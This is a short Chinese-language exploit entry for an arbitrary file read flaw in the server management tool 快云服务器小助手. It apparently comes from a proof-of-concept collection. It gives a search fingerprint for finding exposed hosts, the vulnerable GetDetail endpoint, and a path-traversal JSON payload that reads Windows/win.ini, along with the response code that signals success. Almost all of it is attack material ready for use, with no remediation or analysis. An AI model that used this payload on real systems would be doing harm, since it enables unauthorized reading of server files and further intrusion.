# 快云服务器小助手getdetail存在任意文件文件读取漏洞

快云服务器小助手 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="base.css"`
- **请求**：`POST /FileMenu/filemana.aspx/GetDetail HTTP/1.1`

**Payload**
```
{"fpath":"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows/win.ini"}
```
- **响应特征**：200